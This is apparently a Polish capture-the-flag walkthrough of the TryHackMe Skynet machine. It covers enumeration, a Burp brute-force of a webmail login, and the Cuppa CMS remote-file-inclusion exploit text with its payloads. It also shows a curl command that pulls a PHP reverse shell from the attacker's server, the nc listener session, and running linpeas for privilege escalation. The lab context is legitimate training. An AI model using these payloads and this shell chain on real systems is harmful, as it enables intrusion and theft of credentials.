                                                                                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                                                                                          
S-1-5-32                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                            
[+] Enumerating users using SID S-1-5-21-2393614426-3774336851-1116533619 and logon username '', password ''                                                                                                                                
                                                                                                                                                                                                                                            
S-1-5-21-2393614426-3774336851-1116533619-501 SKYNET\nobody (Local User)                                                                                                                                                                    
S-1-5-21-2393614426-3774336851-1116533619-513 SKYNET\None (Domain Group)                                                                                                                                                                    
S-1-5-21-2393614426-3774336851-1116533619-1000 SKYNET\milesdyson (Local User)                                                                                                                                                               
                                                                                                                                                                                                                                            
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                                                           
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-22-1-1001 Unix User\milesdyson (Local User)                                                                                                                                                                                             

 ================================( Getting printer info for 10.10.37.27 )================================
                                                                                                                                                                                                                                            
No printers returned.                                                                                                                                                                                                                       


enum4linux complete on Thu Jun 29 04:42:29 2023
```

## gobuster:
```
─$ gobuster dir -u http://10.10.60.238:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2> Skynet_gobuster

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.60.238:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/29 13:28:00 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.60.238/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.60.238/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.60.238/js/]
/config               (Status: 301) [Size: 313] [--> http://10.10.60.238/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.60.238/ai/]
/squirrelmail         (Status: 301) [Size: 319] [--> http://10.10.60.238/squirrelmail/]
/server-status        (Status: 403) [Size: 277]
            
===============================================================
2023/06/29 13:56:48 Finished
===============================================================
```
`GOBUSTER` pokazuje mi nowe wektory do sprawdzenia. Jednym z nich jest `squirrelmail`, znajduje się tam panel do logowania. Mając już słownik potencjalnych haseł i nazwę użytkownika mogę spróbować zalogować się wykorzystując metodę `brute-force`. Postanowiłem użyć narzędzie `Burpsuide`.
1. Za pomocą `Burp'a` i przeglądarki przechwytuję wysyłane zapytanie. Używam danych do logowania: `MilesDyson:xyz`.
2. W narzędziu `Burp` moje zapytanie wysyłam do `Intrudera`. Na zapytaniu klikam prawym przyciskiem myszy i wybieram `Send to Intruder`.
3. W module `Intruder` pozostawiam `Atack type: Sniper`, zaznaczam słowo `xyz` do podmiany na słowa ze słownika.
4. Przechodzę do zakładki `Payloads` i tam w panelu `Payload settings (Simple list)` dodaję mój słownik.
5. Wybieram pomarańczowy przełącznik `Start attack` i obserwuję. Słowo o innym statusie niż reszta jest tym którego szukam.

![](/graphic/skynet_squirrelmail_login.bmp)
![](/graphic/skynet_burp_zapytanie.bmp)
![](/graphic/skynet_burp_ustalenie_targetu.bmp)
![](/graphic/skynet_burp_ustawienia_payloud.bmp)
![](/graphic/skynet_burp_wyliczanie.bmp)

* Mogłem urzyć narzędzia `Burp` do tego zadania w wersji `comunity` gdyż słownik nie był zbyt długi. Niestety w wersji darmowej `Burp` podczas zautomatyzowanych ataków zwalnia i przy dużych słownikach trwało by to "wieki".

Po zalogowaniu na platformę widzę wiadomości e-mail. W jednej z nich znajduje się hasło, które wykorzystuję do zalogowania się, za pomocą `smbclient`,  do udziału użytkownika  `Miles Dyson`.

![](/graphic/skynet_squirrelmail_maile.bmp)
![](/graphic/skynet_squirrelmail_maile_has%C5%82o.bmp)
## smbclient Miles Dyson:

W udziale użytkownika `Miles Dyson` znajdują się pliki`.pdf` i katalog `note`. Po przejściu do tego katalogu widzę plik `important.txt`, który pobieram.

`smbclient -U milesdyson '//10.10.60.238/milesdyson' `

*Hasło z e-mail*: 
```
)s{A&2Z=F^n_E.B`
```

```
─$ smbclient -U milesdyson '//10.10.60.238/milesdyson'
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5796136 blocks available

\notes
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

                9204224 blocks of size 1024. 5789840 blocks available
smb: \> get important.txt
```
Plik `important.txt` zawiera opis kolejnej podstrony internetowej.
![](/graphic/skynet_importent_45kra24zxs28v3yd.bmp)

![](/graphic/skynet_strona_45kra24zxs28v3yd.bmp)

## gobuster /45kra24zxs28v3yd:

Po znalezieniu kolejnej strony internetowej sprawdzam narzędziem `gobuster`, czy znajdują się tam kolejne podstrony. Sprawdzam, co mogę znaleść we wskazanej podstronie `administrator`.

![](/graphic/skynet_gobuster_45kra24zxs28v3yd.bmp)

Na odkrytej podstronie `/administrator` znajduje się formularz logowania do aplikacji `Cuppa cms`.

![](/graphic/skynet_strona_45kra24zxs28v3yd_administrator.bmp)

## searchsploit:

Szukam podatności aplikacji `cuppa cms`. Po znalezieniu podatności kopiuję plik z opisem podatności do katalogu, w którym zbieram wszystkie informacje związane z tą maszyną.

```
─$ searchsploit cuppa cms
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                   | php/webapps/25971.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                    
─$ searchsploit -m php/webapps/25971.txt         
  Exploit: Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/25971
     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt
    Codes: OSVDB-94101
 Verified: True
File Type: C++ source, ASCII text, with very long lines (876)
Copied to: /home/kali/Desktop/TryHackMe/Skynet/25971.txt


                                                                                                                    
─$ ls
 25971.txt                                                   Skyne_enum4linux.txt
 attention.txt                                               skynet_drMilesDyson_gobuster.txt
 important.txt                                               skynet_gobuster.txt                        
 Skynet_nikto.txt
 log1.txt                                                    Skynet_nmap.gnmap
 Skynet_nmap.nmap
 Skynet_nmap.xml
```

```
─$ cat 25971.txt     
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################   
```

Osoba atakująca może za pomocą tej luki dołączyć lokalne lub zdalne pliki PHP. Co oznacza, że możemy dołączyć [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Ta luka w zabezpieczeniach może doprowadzić do całkowitego naruszenia bezpieczeństwa serwera.


## Odwrócowa powłoka:

Pobieram plik z odwróconą powłoką poleceniem `wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php` do katalogu bieżącego i zgodnie z opisem podmieniam `ip` na ten maszyny atakującej i wybieram `port`, na którym będę nasłuchiwać. W bieżącym katalogu poleceniem `python3 -m http.server 9000` uruchamiam serwer `www` i w innej karcie konsoli uruchamiam nasłuchiwanie na wskazanym porcie. Poleceniem `curl http://10.10.197.235/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.78.81:9000/php-reverse-shell.php` wysyłam odwróconą powłokę.

![](/graphic/skynet_reverse_shell_ustawienia.bmp)

![](/graphic/skynet_reverse_shell_wys%C5%82anie_efekt.bmp)

```
─$ nc -nvlp 9999
listening on [any] 9999 ...
connect to [10.8.78.81] from (UNKNOWN) [10.10.29.112] 50478
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 02:38:29 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cd home
$ ls
milesdyson
$ cd milesdyson
$ ls
backups
mail
share
user.txt
$ cat user.txt
7ce5c2109a40f958099283600a9ae807
$ cd /
\$ ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cd root
/bin/sh: 12: cd: can't cd to root
$ 
```
W ten sposób mogłem sprawdzić, co znajduje się w katalogu domowym użytkownika `Miles Dyson`. Niestety ten użytkownik nie ma uprawnień do wejścia do katalogu `root`.

Ustabilizowanie powłoki i eksport jej do pełnego shella:

```
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@skynet:/$ export TERM=xterm 
```

Enumeracja systemu za pomocą narzędzia `LeanPEAS`:

1. Do katalogu, w którym otwarty mam serwer `www` za pomocą polecenia `─$ wget https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh ` pobieram narzędzie [LinPEAS](https://raw.githubusercontent.com/Cerbersec/scripts/master/linux/linpeas.sh), które pokaże mi wektory uzyskania uprawnień `root`. 
![](/graphic/skynet_linpeas_pobieranie.bmp)
2. Na maszynie atakowanej przechodzę do katalogu `tmp` i poleceniem `wget "http://10.8.78.81:9000/linpeas.sh"` pobieram narzędzie `LinePEAS`.
3. Następnie poleceniem `chmode +x leanpeas.sh` dodaję uprawnienia do uruchomienia/odczytu pobranego pliku.
![](/graphic/skynet_linpeas_uruchomienie.bmp)

```
www-data@skynet:/tmp$ wget "http://10.8.78.81:9000/linpeas.sh"
wget "http://10.8.78.81:9000/linpeas.sh"
--2023-06-30 10:03:18--  http://10.8.78.81:9000/linpeas.sh
Connecting to 10.8.78.81:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 131.02K   749KB/s    in 0.2s    

2023-06-30 10:03:18 (749 KB/s) - 'linpeas.sh' saved [134168/134168]

www-data@skynet:/tmp$ ls
ls
linpeas.sh
systemd-private-25d64246331d477fafe932e77d492919-dovecot.service-GoNDML
systemd-private-25d64246331d477fafe932e77d492919-systemd-timesyncd.service-ZHp5fI
www-data@skynet:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@skynet:/tmp$ ./linpeas.sh
./linpeas.sh

                         
                         
                         
                         
                         
                         
                         
                         
                         
                         
                         
                         
                         
  linpeas v2.2.7 by carlospolop
                                                                                                                    
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:                                                                                                            
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: skynet
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (You can use linpeas to discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (You can use linpeas to discover hosts/port scanning, learn more with -h)                                                                                                 
                                                                                                                    

====================================( System Information )====================================
[+] Operative system                                                                                                
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                     
Linux version 4.8.0-58-generic (buildd@lgw01-21) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.6 LTS
Release:        16.04
Codename:       xenial

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                        
Sudo version 1.8.16                                                                                                 

[+] PATH
[i] Any writable folder in original PATH? (a new completed path will be exported)                                   
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                        
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[+] Date
Fri Jun 30 10:05:33 CDT 2023                                                                                        

[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                    
udev            485M     0  485M   0% /dev
tmpfs            99M  3.2M   96M   4% /run
/dev/xvda1      8.8G  2.8G  5.6G  34% /
tmpfs           495M     0  495M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           495M     0  495M   0% /sys/fs/cgroup
              total        used        free      shared  buff/cache   available
Mem:        1013760      191320      218216        8696      604224      639292
Swap:        998396           0      998396

[+] Environment
[i] Any private information inside environment variables?                                                           
HISTFILESIZE=0                                                                                                      
SHLVL=1
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
_=./linpeas.sh
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Looking for Signature verification failed in dmseg
 Not Found                                                                                                          
                                                                                                                    
[+] selinux enabled? .......... sestatus Not Found
[+] Printer? .......... lpstat Not Found                                                                            
[+] Is this a container? .......... No                                                                              
[+] Is ASLR enabled? .......... Yes                                                                                 

=========================================( Devices )==========================================
[+] Any sd* disk in /dev? (limit 20)                                                                                
                                                                                                                    
[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                                                         
UUID=a3e25baf-bf7f-418a-a691-679c054d8fea       /       ext4    errors=remount-ro       0 1                         
UUID=354616bf-923c-43d3-a040-ae36babbbab3       none    swap    sw      0 0


====================================( Available Software )====================================
[+] Useful software?                                                                                                
/bin/nc                                                                                                             
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/gcc
/usr/bin/g++
/usr/bin/make
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo

[+] Installed compilers?
ii  g++                                   4:5.3.1-1ubuntu1                                         amd64        GNU C++ compiler
ii  g++-5                                 5.4.0-6ubuntu1~16.04.11                                  amd64        GNU C++ compiler
ii  gcc                                   4:5.3.1-1ubuntu1                                         amd64        GNU C compiler
ii  gcc-5                                 5.4.0-6ubuntu1~16.04.11                                  amd64        GNU C compiler
/usr/bin/gcc
/usr/bin/g++


================================( Processes, Cron & Services )================================
[+] Cleaned processes                                                                                               
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                            
root         1  0.7  0.5 119640  5812 ?        Ss   09:54   0:04 /sbin/init
root       391  0.0  0.2  28448  2700 ?        Ss   09:54   0:00 /lib/systemd/systemd-journald
root       444  0.0  0.1  94772  1480 ?        Ss   09:54   0:00 /sbin/lvmetad -f
root       461  0.0  0.4  42940  4308 ?        Ss   09:54   0:00 /lib/systemd/systemd-udevd
systemd+   497  0.0  0.2 100320  2588 ?        Ssl  09:54   0:00 /lib/systemd/systemd-timesyncd
syslog     792  0.0  0.3 256392  3192 ?        Ssl  09:54   0:00 /usr/sbin/rsyslogd -n
root       822  0.0  0.1 160900  1452 ?        Ssl  09:54   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       827  0.0  0.8 275860  8292 ?        Ssl  09:54   0:00 /usr/lib/accountsservice/accounts-daemon
message+   828  0.0  0.3  42896  3792 ?        Ss   09:54   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root       842  0.0  0.1   4392  1276 ?        Ss   09:54   0:00 /usr/sbin/acpid
root       849  0.0  0.1  20096  1196 ?        Ss   09:54   0:00 /lib/systemd/systemd-logind
root       856  0.0  0.2  29008  2892 ?        Ss   09:54   0:00 /usr/sbin/cron -f
daemon     858  0.0  0.2  26044  2260 ?        Ss   09:54   0:00 /usr/sbin/atd -f
root       873  0.0  0.7 277088  7908 ?        Ssl  09:54   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       887  0.0  0.0  13368   160 ?        Ss   09:54   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1036  0.0  1.5 337908 15428 ?        Ss   09:54   0:00 /usr/sbin/smbd -D
root      1039  0.0  0.5 329804  5940 ?        S    09:54   0:00 /usr/sbin/smbd -D
root      1074  0.0  0.5 337908  5392 ?        S    09:54   0:00 /usr/sbin/smbd -D
root      1080  0.0  0.0  16124   860 ?        Ss   09:54   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
mysql     1195  0.0 14.0 1108056 142308 ?      Ssl  09:55   0:00 /usr/sbin/mysqld
root      1211  0.0  0.0   5216   152 ?        Ss   09:55   0:00 /sbin/iscsid
root      1212  0.0  0.3   5716  3512 ?        S<Ls 09:55   0:00 /sbin/iscsid
root      1213  0.0  0.5  65512  5320 ?        Ss   09:55   0:00 /usr/sbin/sshd -D
root      1224  0.0  0.2  18032  2704 ?        Ss   09:55   0:00 /usr/sbin/dovecot
dovecot   1228  0.0  0.0   9520   972 ?        S    09:55   0:00 dovecot/anvil
root      1229  0.0  0.2   9652  2380 ?        S    09:55   0:00 dovecot/log
root      1265  0.0  0.1  15932  1796 tty1     Ss+  09:55   0:00 /sbin/agetty --noclear tty1 linux
root      1269  0.0  0.2  15748  2192 ttyS0    Ss+  09:55   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
root      1341  0.0  3.4 466648 35272 ?        Ss   09:55   0:00 /usr/sbin/apache2 -k start
www-data  1370  0.0  1.6 467088 16252 ?        S    09:55   0:00 /usr/sbin/apache2 -k start
www-data  1371  0.0  1.0 466672 10240 ?        S    09:55   0:00 /usr/sbin/apache2 -k start
www-data  1372  0.0  1.0 466672 10240 ?        S    09:55   0:00 /usr/sbin/apache2 -k start
www-data  1373  0.0  1.0 466672 10240 ?        S    09:55   0:00 /usr/sbin/apache2 -k start
www-data  1374  0.0  1.0 466672 10240 ?        S    09:55   0:00 /usr/sbin/apache2 -k start
root      1382  0.0  0.5 240004  5920 ?        Ss   09:55   0:00 /usr/sbin/nmbd -D
root      1384  0.0  0.7 286708  7472 ?        Ss   09:55   0:00 /usr/sbin/winbindd
root      1385  0.0  0.8 286840  9084 ?        S    09:55   0:00 /usr/sbin/winbindd
root      1564  0.0  0.4  65404  4400 ?        Ss   09:55   0:00 /usr/lib/postfix/sbin/master
postfix   1565  0.0  0.4  67472  4352 ?        S    09:55   0:00 pickup -l -t unix -u -c
postfix   1566  0.0  0.4  67520  4552 ?        S    09:55   0:00 qmgr -l -t unix -u
www-data  1607  0.0  0.0   4500   748 ?        S    09:59   0:00 sh -c uname -a; w; id; /bin/sh -i
www-data  1611  0.0  0.0   4500   740 ?        S    09:59   0:00 /bin/sh -i
www-data  1616  0.0  1.0 466672 10240 ?        S    09:59   0:00 /usr/sbin/apache2 -k start
www-data  1618  0.0  0.6  32112  6748 ?        S    09:59   0:00 python -c import pty; pty.spawn("/bin/bash")
www-data  1619  0.0  0.3  18232  3296 pts/0    Ss   09:59   0:00 /bin/bash
www-data  1758  0.0  0.1   4500  1856 pts/0    S+   10:05   0:00 /bin/sh ./linpeas.sh
www-data  1941  0.0  0.2  34424  2800 pts/0    R+   10:05   0:00 ps aux

[+] Binary processes permissions
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                           
-rwxr-xr-x 1 root root  1037528 Jul 12  2019 /bin/bash                                                              
lrwxrwxrwx 1 root root        4 Sep 17  2019 /bin/sh -> dash
-rwxr-xr-x 1 root root   326232 Apr  3  2019 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Apr  3  2019 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Apr  3  2019 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Apr  3  2019 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 May 16  2018 /sbin/agetty
-rwxr-xr-x 1 root root   487248 Mar  5  2018 /sbin/dhclient
lrwxrwxrwx 1 root root       20 Apr  3  2019 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   783984 Dec 11  2018 /sbin/iscsid
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root root   513216 Nov  8  2017 /sbin/mdadm
-rwxr-xr-x 1 root root   224208 Jun 10  2019 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Nov  8  2017 /usr/bin/lxcfs
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    15048 Mar 27  2019 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root    38864 Jan 17  2018 /usr/lib/postfix/sbin/master
-rwxr-xr-x 1 root root    48112 Apr  8  2016 /usr/sbin/acpid
